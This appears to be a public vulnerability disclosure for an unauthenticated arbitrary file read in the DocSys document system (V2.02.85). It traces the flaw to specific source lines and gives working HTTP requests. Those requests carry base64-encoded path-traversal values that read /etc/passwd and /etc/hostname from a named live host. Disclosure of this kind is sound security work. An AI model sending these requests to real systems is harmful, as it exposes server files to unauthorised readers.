# DocSys - Arbitrary File Read Vulnerability

## Vulnerability Description

DocSys-master is a document management system. The downloadDocEx interface in src/com/DocSystem/controller/DocController.java has an arbitrary file reading vulnerability:

---

## Affected Versions

DocSys-master（latest version）V2.02.85

[DocSys_V2.02.85](https://gitee.com/RainyGao/DocSys/releases/tag/DocSys_V2.02.85)

---

## Utilize conditions

- remote access
- No login required

---

## Vulnerability Reproduction

### Arbitrary file reading

**File path**：`src/com/DocSystem/controller/DocController.java`
**line number**：3048-3050

The user request parameters, targetPath and targetName, are directly obtained from the HTTP request without authentication checks

![image-20260803185644271](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803185644271.5q84opwjsi.webp)

3067-3085 — Base64 decoding, without any path verification, line 3092 is directly passed to the file reading method

![image-20260803185823627](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803185823627.46eauvuk0.webp)

src/com/DocSystem/controller/BaseController.java

Line 2338 directly calls the file input/output stream to read the file

![image-20260803190623579](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803190623579.77e9qh21ya.webp)

---

Vulnerability Reproduction：

**Request package**：Read ect/passwd

```
GET /DocSystem/Doc/downloadDocEx.do?targetPath=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA&targetName= HTTP/1.1
Host: dw.gofreeteam.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Content-Length: 2
```

![image-20260803181622078](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803181622078.7p4bf23ob0.webp)

Read/etc/hostname

```
/DocSystem/Doc/downloadDocEx.do?targetPath=Li4vLi4vLi4vLi4vLi4vLi4vZXRjL2hvc3RuYW1l&targetName=
```

![image-20260803181729829](https://github.com/fangtang7/picx-images-hosting/raw/master/DocSys/image-20260803181729829.4ubn99orj5.webp)
